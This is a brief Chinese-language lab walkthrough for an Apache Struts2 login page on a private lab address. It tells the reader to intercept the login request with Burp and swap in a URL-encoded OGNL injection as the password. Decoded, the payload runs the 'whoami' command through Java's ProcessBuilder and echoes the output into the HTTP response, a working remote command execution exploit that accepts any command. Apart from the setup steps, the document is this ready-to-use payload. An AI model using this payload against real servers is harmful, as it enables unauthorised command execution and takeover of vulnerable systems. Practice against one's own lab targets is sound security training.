
# 实战

在浏览器输入

```
http://192.168.1.170:7777/struts2/index.jsp
```

使用burp对登录框进行抓包

将post内容改成下面

```
username=111&password=%25%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%22%77%68%6f%61%6d%69%22%7d%29%29%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%66%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%22%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d%0a
```
